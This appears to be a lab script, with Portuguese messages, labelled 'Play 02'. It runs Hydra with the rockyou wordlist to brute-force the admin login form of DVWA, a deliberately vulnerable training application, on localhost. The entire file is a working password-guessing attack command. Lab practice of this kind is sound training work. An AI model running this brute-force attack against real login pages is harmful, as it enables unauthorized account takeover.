#!/bin/bash
echo "[INFO] Iniciando Play 02 — Hydra em DVWA"
TARGET="http://localhost:80/dvwa/login.php"
USER="admin"
PASSLIST="/usr/share/wordlists/rockyou.txt"

hydra -l $USER -P $PASSLIST $TARGET http-post-form "username=^USER^&password=^PASS^:Login failed"

echo "[SUCESSO] Ataque finalizado. Verifique saída acima."
